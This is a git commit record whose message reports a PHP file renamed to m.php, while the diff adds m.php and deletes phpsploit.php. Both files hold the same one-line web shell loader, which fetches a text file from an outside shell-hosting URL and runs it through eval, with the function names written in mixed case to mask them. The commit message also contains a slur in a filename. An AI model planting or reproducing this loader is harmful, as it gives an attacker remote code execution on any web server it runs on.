d9b9868d0b2fdbe9e16295e14c949aa09790969a
Muhammad Rasyad <57721604+nastar-id@users.noreply.github.com>
2024-08-18 10:54:11 +0700

    Rename nigg.php to m.php

---
+++ m.php
@@ -0,0 +1,1 @@
+<? $_AB = "https://shell.prinsh.com/Nathan/marijuana.txt";$_B = "FILE_GET_CONTENTS"; eVAL("?>".$_B($_AB));
--- phpsploit.php
+++
@@ -1,1 +0,0 @@
-<? $_AB = "https://shell.prinsh.com/Nathan/marijuana.txt";$_B = "FILE_GET_CONTENTS"; eVAL("?>".$_B($_AB));
